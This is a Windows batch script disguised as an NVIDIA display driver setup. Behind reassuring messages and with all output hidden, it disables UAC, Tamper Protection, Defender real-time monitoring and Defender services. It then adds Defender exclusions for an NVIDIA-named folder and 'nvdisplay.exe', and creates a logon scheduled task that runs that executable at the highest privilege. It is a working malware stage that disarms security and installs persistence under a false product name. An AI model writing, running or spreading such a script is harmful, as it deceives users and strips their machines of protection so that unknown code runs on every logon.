@echo off
title NVIDIA Display Driver - Final Setup (Full)
echo =========================================
echo   NVIDIA Display Driver - Final Setup
echo =========================================
echo.
echo Please wait...

:: 1. Disable UAC
reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1

:: 2. Disable Tamper Protection
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Features" /v TamperProtection /t REG_DWORD /d 0 /f >nul 2>&1

:: 3. Disable Defender real-time protection via registry
reg add "HKLM\SOFTWARE\Microsoft\Windows Defender\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1

:: 4. Disable Defender via policy (persistent)
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1

:: 5. Stop Defender services
sc stop WinDefend >nul 2>&1
sc config WinDefend start= disabled >nul 2>&1
sc stop WdNisSvc >nul 2>&1
sc config WdNisSvc start= disabled >nul 2>&1

:: 6. Create target folder
mkdir "C:\Program Files (x86)\NVIDIA Corporation" 2>nul

:: 7. Add exclusions for folder and process (optional, but safe)
powershell -Command "Add-MpPreference -ExclusionPath 'C:\Program Files (x86)\NVIDIA Corporation'" >nul 2>&1
powershell -Command "Add-MpPreference -ExclusionProcess 'nvdisplay.exe'" >nul 2>&1

:: 8. Remove old scheduled task
schtasks /delete /tn "NVIDIA Display Driver" /f >nul 2>&1

:: 9. Remove registry autorun (if any)
reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "NVIDIA Display Driver" /f >nul 2>&1

:: 10. Create task via XML with WorkingDirectory
set "TASK_NAME=NVIDIA Display Driver"
set "APP_PATH=C:\Program Files (x86)\NVIDIA Corporation\nvdisplay.exe"
set "APP_DIR=C:\Program Files (x86)\NVIDIA Corporation"
set "XML_FILE=%TEMP%\nv_task.xml"

:: Get SID of current user
for /f "tokens=2 delims==" %%i in ('wmic useraccount where name^="%USERNAME%" get sid /value 2^>nul') do set "USER_SID=%%i"
if "%USER_SID%"=="" (
    echo [ERR] Cannot get SID. Exiting.
    pause
    exit /b 1
)

(
echo ^<?xml version="1.0" encoding="UTF-16"?^>
echo ^<Task version="1.2" xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task"^>
echo   ^<Triggers^>
echo     ^<LogonTrigger^>
echo       ^<Enabled^>true^</Enabled^>
echo       ^<UserId^>%USER_SID%^</UserId^>
echo       ^<Delay^>PT30S^</Delay^>
echo     ^</LogonTrigger^>
echo   ^</Triggers^>
echo   ^<Principals^>
echo     ^<Principal id="Author"^>
echo       ^<UserId^>%USER_SID%^</UserId^>
echo       ^<LogonType^>InteractiveToken^</LogonType^>
echo       ^<RunLevel^>HighestAvailable^</RunLevel^>
echo     ^</Principal^>
echo   ^</Principals^>
echo   ^<Settings^>
echo     ^<MultipleInstancesPolicy^>IgnoreNew^</MultipleInstancesPolicy^>
echo     ^<DisallowStartIfOnBatteries^>false^</DisallowStartIfOnBatteries^>
echo     ^<StopIfGoingOnBatteries^>false^</StopIfGoingOnBatteries^>
echo     ^<ExecutionTimeLimit^>PT0S^</ExecutionTimeLimit^>
echo     ^<Enabled^>true^</Enabled^>
echo   ^</Settings^>
echo   ^<Actions^>
echo     ^<Exec^>
echo       ^<Command^>%APP_PATH%^</Command^>
echo       ^<WorkingDirectory^>%APP_DIR%^</WorkingDirectory^>
echo     ^</Exec^>
echo   ^</Actions^>
echo ^</Task^>
) > "%XML_FILE%"

schtasks /create /tn "%TASK_NAME%" /xml "%XML_FILE%" /f >nul 2>&1
del "%XML_FILE%" >nul 2>&1

echo.
echo Setup completed. Please reboot your computer.
echo This window will close in 10 seconds...
timeout /t 10 /nobreak >nul
exit